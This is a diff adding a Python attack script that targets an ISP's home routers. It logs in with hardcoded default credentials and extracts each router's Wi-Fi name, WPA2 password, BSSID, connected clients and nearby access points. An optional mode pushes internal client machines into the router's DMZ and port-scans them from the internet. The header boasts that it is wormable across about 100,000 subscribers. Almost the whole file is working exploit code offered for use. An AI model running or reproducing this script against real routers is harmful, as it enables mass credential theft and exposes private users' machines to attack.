@@ -1,0 +1,287 @@
+#! /usr/bin/python3
+
+"""
+This script accepts a [famous ISP] router IP address and a port  (default is 80)
+using a set of default credentials it will login and extracts the ESSID,WPA2 password,BSSID among other things.
+this is wormable and can be used to extract a whole lot of info about the ISP users can also access internal network clients by putting their IPs on DMZ
+a lot of bad things can happen. Think of 100k subscribers including corporates clients.
+How to you get to reach these internal IPs? The only requirement is to be a subscriber then grab the range of your WAN IP and everyone on them will be there.
+"""
+
+#imports
+
+import re
+import requests
+import argparse
+import ipaddress
+import time
+import nmap
+import pandas as pd
+from requests import Session
+from bs4 import BeautifulSoup as bs
+
+
+#banner function
+def banner():
+    str=(
+    "\n##############################################################################\n"
+    "######---------------------kUKu r0uT3r pWN Ver 0.4-----------------------#####\n"
+    "######________________________--@plast1k_--______________________________#####\n"
+    "######+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#####\n\n"
+    "Usage: ./kUKu_sh!t.py -i [IP] -p [port] (default port is 80)\n\n"
+    "To script or use in a bash for loop simply disable this banner by commenting\n"
+    "out #banner() function call on line #240\n"
+    "use -h for help\n\n"
+    
+    )
+    print(str)
+    return
+
+#check the router model by login in
+def check_router(router_ip):
+    try:
+        
+        response = requests.get('http://'+str(router_ip),timeout=5)
+    except requests.ConnectionError:
+        print("Can't connect to "+str(router_ip)+ ",  sorry..")
+        check_router.model='fail'
+    else:
+    
+        if (response.status_code==200):
+            check_router.model='new'
+        elif (response.status_code==401):
+            check_router.model='old'
+        else:
+            check_router.model='fail'
+        response.close()
+    return
+
+
+#get new_router essid and Passphrase
+def new_router(router_ip):
+    user_name=''
+    password='aDm1n$TR8r'
+    with Session() as s:
+        #get CSRF value from the login page
+        login_page = s.get('http://'+str(router_ip)+'/login.asp')
+        bs_login_page = bs(login_page.content, "html.parser")
+        token =bs_login_page.find("input", {"name":"CSRFValue"})["value"]
+        #pack all the login data variables
+        login_data = {"CSRFValue":token,"loginUsername":user_name,"loginPassword":password,"logoffUser":0}
+        #finally login
+        s.post('http://'+str(router_ip)+'/goform/login',login_data)
+        #grap the page with passwords
+        main_page = s.get('http://'+str(router_ip)+'/wlanPrimaryNetwork.asp')
+        #parse the page and extract ESSID and Passphrase        
+        bs_main_page=bs(main_page.content, "html.parser")
+        new_router.essid=bs_main_page.find("input",{"name":"ServiceSetIdentifier"})["value"]
+        new_router.wifi_password=bs_main_page.find("input",{"name":"WpaPreSharedKey"})["value"]
+        #using the same session get the MAC address from the WLAN Radio page
+        status_page=s.get('http://'+str(router_ip)+'/wlanRadio.asp')
+        bs_status_page=bs(status_page.content,"html.parser")
+        table = bs_status_page.find('table')
+        MAC_address=table.findAll(text=re.compile(':'))
+        new_router.BSSID=str(MAC_address[2])   
+        #Grab Connceted WiFi Clients page and store it as HTML
+        wifi_clients_page=s.get('http://'+str(router_ip)+'/wlanAccess.asp')
+        bs_wifi_clients_page=bs(wifi_clients_page.content,"html.parser")
+        simple_html=str(bs_wifi_clients_page)
+        #use pandas and extract the tables
+        all_tables=pd.read_html(simple_html, header=0)
+        #get only table number  with clients info
+        WiFi_clients_df_table=all_tables[4].head()          
+        WiFi_clients_df_table.columns=['MAC Address','Age','RSSI(dBm)','Type','IP Address','Host Name']
+        new_router.WiFi_clients=WiFi_clients_df_table.iloc[:,[0,1,2,4,5]].head()
+        s.close()
+    return
+
+
+
+#get new_router essid and Passphrase
+def old_router(router_ip):
+    user_name='admin'
+    password='password'
+    #uses basic auth
+    r = requests.get('http://'+str(router_ip)+'/wlanPrimaryNetwork.asp', auth=(user_name,password))
+    bs_page=bs(r.content, "html.parser")
+    old_router.essid=bs_page.find("input",{"name":"ServiceSetIdentifier"})["value"]
+    old_router.wifi_password=bs_page.find("input",{"name":"WpaPreSharedKey"})["value"]
+    r.close()
+    #log in and access another page to get the MAC address too
+    r = requests.get('http://'+str(router_ip)+'/RgSwInfo.asp', auth=(user_name,password))
+    bs_page=bs(r.content, "html.parser")
+    #assuming one table thus the find as opposed to findAll()
+    table = bs_page.find('table')
+    MAC_address=table.findAll(text=re.compile(':'))
+    old_router.BSSID=str(MAC_address[0])
+    #get all connected WiFi clients
+    #use basic auth as before
+    r = requests.get('http://'+str(router_ip)+'/wlanAccess.asp', auth=(user_name,password))
+    #use panda to read all the tables
+    all_tables=pd.read_html(r.content, header=0)
+    #we only need table #4 with WiFi clients info  
+    old_router.WiFi_clients=all_tables[3].head()
+    r.close()   
+    return
+
+#scan nearby WiFi APs on old routers
+def old_scan_nearby_APs(router_ip):
+    user_name='admin'
+    password='password'
+    #uses basic auth
+    r = requests.get('http://'+str(router_ip)+'/wlanScanPopup.asp', auth=(user_name,password))
+    #use panda to the only table on nearby APs page
+    nearby_ap_table=pd.read_html(r.content)
+    APs_table_df=nearby_ap_table[1].head()
+    old_scan_nearby_APs.nearby_APs=APs_table_df.iloc[:,[0,1,6]]
+    r.close()   
+    return
+
+
+#scan nearby WiFi APs on new routers
+def new_scan_nearby_APs(router_ip):
+    user_name=''
+    password='aDm1n$TR8r'
+    with Session() as s:
+        #get CSRF value from the login page
+        login_page = s.get('http://'+str(router_ip)+'/login.asp')
+        bs_login_page = bs(login_page.content, "html.parser")
+        token =bs_login_page.find("input", {"name":"CSRFValue"})["value"]
+        #pack all the login data variables
+        login_data = {"CSRFValue":token,"loginUsername":user_name,"loginPassword":password,"logoffUser":0}
+        #finally login
+        s.post('http://'+str(router_ip)+'/goform/login',login_data)
+        #scan the nearby WiFi APs
+        wifi_APs_page=s.get('http://'+str(router_ip)+'/wlanScanPopup.asp')
+        bs_APs_page=bs(wifi_APs_page.content,"html.parser")
+        simple_html=str(bs_APs_page)
+        #use pandas and extract the tables
+        APs_table=pd.read_html(simple_html)
+        #get the table with APs into a data frame
+        APs_table_df=APs_table[1].head()          
+        APs_table_df.columns=['Network Name','Security Mode','C','D','F','G','BSSID','I','J']
+        new_scan_nearby_APs.nearby_APs=APs_table_df.iloc[:,[0,1,6]].head()
+        s.close()
+    
+#nmap port scan all the connected WiFi clients on old routers
+
+def old_port_scan(router_ip):
+    user_name='admin'
+    password='password'
+    #get all connected WiFi clients
+    #use basic auth 
+    r = requests.get('http://'+str(router_ip)+'/wlanAccess.asp', auth=(user_name,password))
+    #use panda to read all the tables
+    all_tables=pd.read_html(r.content, header=0)
+    #we only need table #4 with WiFi clients info  
+    old_port_scan.WiFi_clients=all_tables[3].head().dropna()
+    #extract all the IP addresses into a list
+    clients_ip_list = old_port_scan.WiFi_clients['IP Addr'].tolist()
+    #clean and remove invalid IP addresses
+   
+    print("Found "+str(len(clients_ip_list))+" Valid IPs connected to the access point..")
+    for i in clients_ip_list:
+        print(i)
+    #get the last octect of each IP address to use in our page
+    for item in clients_ip_list:
+        IP_address=item
+        a,b,c,d=IP_address.split('.')
+        #we got the last octect as 'd' lets expose the host and scan it for open ports
+        requests.post('http://'+str(router_ip)+'/goform/RgDmzHost',data={'DmzHostIP3':d,'btnApply':'Apply'},auth=(user_name,password))        
+        print("[+]Internal host "+IP_address+" Successfuly Exposed to the public internet..")
+        print("[+]Lets sleep for few seconds to make the slow page to update...")
+        time.sleep( 5 )
+        print("[+] Getting the external IP address....")
+        #get the public IP Address
+        #use basic auth 
+        r = requests.get('http://'+str(router_ip)+'/RgSetup.asp', auth=(user_name,password))
+        #use panda to read public IP from the HTML table
+        tables=pd.read_html(r.content,skiprows=7, header = None)
+        data_frame=tables[0].head()
+        external_IP_address=data_frame.iloc[:,[1,2]].head(1).at[0,2]
+        print("[+] Great got the external address...  "+external_IP_address)        
+        #nmap port scanner 
+        print("[+] Initiating a port scan via router external IP........")
+        host=external_IP_address
+        top_ports="20,21,22,23,25,80,139,443,445,3306,3389,5060,8080,8081,8443,10000"
+        nm=nmap.PortScanner()
+        #scan some predefined top ports
+        nm.scan(host, top_ports,arguments='-sV')
+        #host info
+        for host in nm.all_hosts():
+            print('--------------------------------------')
+            print('Host : '+host+'  ( '+nm[host].hostname()+' )')
+            print('State : '+nm[host].state())
+        
+        #port info
+        for proto in nm[host].all_protocols():
+            print('Protocol :'+proto)
+        #ports
+        lport = nm[host][proto].keys()
+        for port in lport:
+            print('Port : '+str(port)+ '       State  '+nm[host][proto][port]['state']+'  '+nm[host][proto][port]['product']+'  '+nm[host][proto][port]['version']+'    '+nm[host][proto][port]['extrainfo'])    
+        print('----------------------------------------\n')           
+
+    #clean up and set DMZ host to '0'
+    print("[+]Cleaning up by hiding the hosts back to their 'secure' LAN ;)....")
+    requests.post('http://'+str(router_ip)+'/goform/RgDmzHost',data={'DmzHostIP3':'0','btnApply':'Apply'},auth=(user_name,password))        
+    r.close()   
+
+    return
+
+    
+#main 
+parser = argparse.ArgumentParser(description='parse user input IP address and a port(Default is 80)')
+parser.add_argument('-i', action='store', dest='IP_address', help="Router IP address to check.....")
+parser.add_argument('-p', action='store', dest='Port', default=80, help="Router web admin port to use (Default is Port 80).." )
+parser.add_argument('-s', action='store', dest='Enable_Scan', default=False, help="Scan the Connected WiFi Clients Over the Internet. -s 1" )
+args = parser.parse_args()
+router_ip = ipaddress.ip_address(args.IP_address)
+port = args.Port
+scan = args.Enable_Scan
+
+#banner()
+print ("\n[+] Loot....\n")
+check_router(router_ip)
+
+if check_router.model=='new':
+    new_router(router_ip)
+    print("IP: "+str(router_ip))
+    print("BSSID: "+new_router.BSSID)
+    print("SSID: "+new_router.essid)
+    print("PASS: "+new_router.wifi_password)
+    #scan for all the connected WiFi Clients
+    print("\n[+] Connected WiFi Clients...... \n")
+    print(new_router.WiFi_clients)    
+    
+    #scan for nearby WiFi Access Points
+    print("\n[+] Nearby Wireless Access Points ..... \n")
+    new_scan_nearby_APs(router_ip)
+    print(new_scan_nearby_APs.nearby_APs)
+    exit()
+
+elif check_router.model=='old':
+    old_router(router_ip)
+    print("IP: "+str(router_ip))
+    print("BSSID: "+old_router.BSSID)
+    print("SSID: "+old_router.essid)
+    print("PASS: "+old_router.wifi_password)  
+    #scan for all the connected WiFi Clients
+    print("\n[+] Connected WiFi Clients...... \n")
+    print(old_router.WiFi_clients)
+
+    #scan for nearby WiFi Access Points
+    print("\n[+] Nearby Wireless Access Points ..... \n")
+    old_scan_nearby_APs(router_ip)
+    print(old_scan_nearby_APs.nearby_APs)
+    if scan:
+        print("Nmap scan of clients enabled.....")
+        old_port_scan(router_ip)
+        exit()
+       
+else:
+    print("[-] No valid Creds found...")
+    print("[-] Exiting.....")
+    exit()
+    
+    
